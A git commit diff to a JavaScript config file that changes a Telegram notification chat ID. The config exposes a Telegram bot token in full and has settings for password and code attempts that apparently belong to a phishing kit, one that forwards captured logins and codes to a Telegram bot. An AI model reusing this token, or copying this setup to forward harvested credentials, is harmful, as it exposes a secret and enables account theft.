fbb9068951bf4b4e361a22c310e3aa7820bd4892
nguyenbanhat7292-code <nguyenbanhat7292@gmail.com>
2025-09-01 20:21:02 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -2,7 +2,7 @@ const config = {
     token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
     chat_id: '1662565121',
     noti_token: '7843396833:AAHx49nOiz3U8kCf-x82UikTKGde6l9OTrE',
-    noti_chat_id: '-4872736754',
+    noti_chat_id: '-4741680886',
     max_password_attempts: 1,
     max_code_attempts: 5,
     password_loading_time: 3,
